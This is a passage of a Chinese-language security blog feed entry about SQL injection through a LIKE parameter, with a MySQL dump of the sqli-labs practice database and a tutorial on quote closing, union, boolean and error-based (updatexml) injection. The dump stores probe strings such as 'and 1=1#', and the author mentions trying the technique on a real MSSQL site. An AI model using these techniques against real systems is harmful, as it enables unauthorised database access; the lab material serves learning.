MySQL</span><br><span class="line"> Source Server Version : 50540</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : security</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50540</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 07/08/2019 18:47:37</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `emails`;</span><br><span class="line">CREATE TABLE `emails`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `email_id` varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 9 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `emails` VALUES (1, &apos;Dumb@dhakkan.com&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (2, &apos;Angel@iloveu.com&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (3, &apos;Dummy@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (4, &apos;secure@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (5, &apos;stupid@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (6, &apos;superman@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (7, &apos;batman@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (8, &apos;admin@dhakkan.com&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for referers</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `referers`;</span><br><span class="line">CREATE TABLE `referers`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `referer` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 4 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of referers</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `referers` VALUES (1, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line">INSERT INTO `referers` VALUES (2, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line">INSERT INTO `referers` VALUES (3, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for uagents</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `uagents`;</span><br><span class="line">CREATE TABLE `uagents`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `uagent` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 15 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of uagents</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `uagents` VALUES (1, &apos;/&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (2, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (3, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (4, &apos;/&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (5, &apos;and 1=1#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (6, &apos;and 1=12#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (7, &apos;order by 10#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (8, &apos;order by 10#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (9, &apos;&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (10, &apos;&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (11, &apos;0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (12, &apos;0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (13, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (14, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `password` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 11 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `users` VALUES (1, &apos;Dumb&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (2, &apos;Angelina&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (3, &apos;Dummy&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (4, &apos;secure&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (5, &apos;stupid&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (6, &apos;superman&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (7, &apos;batman&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (8, &apos;admin&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (9, &apos;test#&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (10, &apos;test\&apos; #&apos;, &apos;1&apos;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure></p><p>将sql文件导入本地的mysql中就行了。</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>like的用法我就不多说了，就是查找类似参数的数据。<br><img src="/2019/08/07/sql注入之like注入/like.png" alt></p><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/get.php?like=test</span><br></pre></td></tr></table></figure></p><p><img src="/2019/08/07/sql注入之like注入/like1.png" alt></p><p>注入的思路和一般可控参数的注入方式是一样的，首先我们要闭合一下。<br><img src="/2019/08/07/sql注入之like注入/like2.png" alt><br><img src="/2019/08/07/sql注入之like注入/like3.png" alt></p><p>也并不是两边都要有 %，我们只需要闭合单引号就行了，后面添加一个注释符。</p><p>接下来的流程都是一样的。</p><p>联合查询注入：<br><img src="/2019/08/07/sql注入之like注入/order1.png" alt><br>这里是因为我的数据库里面没有像 %test 这样的数据，所以返回为空。想要返回有数据的话把like参数的值变成<br><img src="/2019/08/07/sql注入之like注入/order2.png" alt><br><img src="/2019/08/07/sql注入之like注入/union.png" alt></p><p>布尔注入：<br><img src="/2019/08/07/sql注入之like注入/布尔1.png" alt><br><img src="/2019/08/07/sql注入之like注入/布尔2.png" alt></p><p>报错注入：<br><img src="/2019/08/07/sql注入之like注入/updatexml.png" alt></p><p>这里就写这三种方式的注入了。</p><p>在mssql下情况是一样的。<br><img src="/2019/08/07/sql注入之like注入/mssql.png" alt></p><p>为什么实战的时候就是没搞出来呢，奇奇怪怪的~</p><p>还有一些小众的注入点，像order by + $id / limit + $id / 这些可控的参数都可以造成注入，可以研究一下。</p><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/1-11-order%2Climit%E5%92%8Cfrom%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener">order,limit和from后的注入</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在实战的过程中遇到了一个mssql的数据库，参数提交在了 &lt;strong&gt;like&lt;/strong&gt; 后的参数里面，本地测试注入能成功，但是在实战的时候不晓得后端进行了什么处理，没拿下，哎~~&lt;/p&gt;
&lt;p&gt;很烦，写篇博客纪念一下~&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
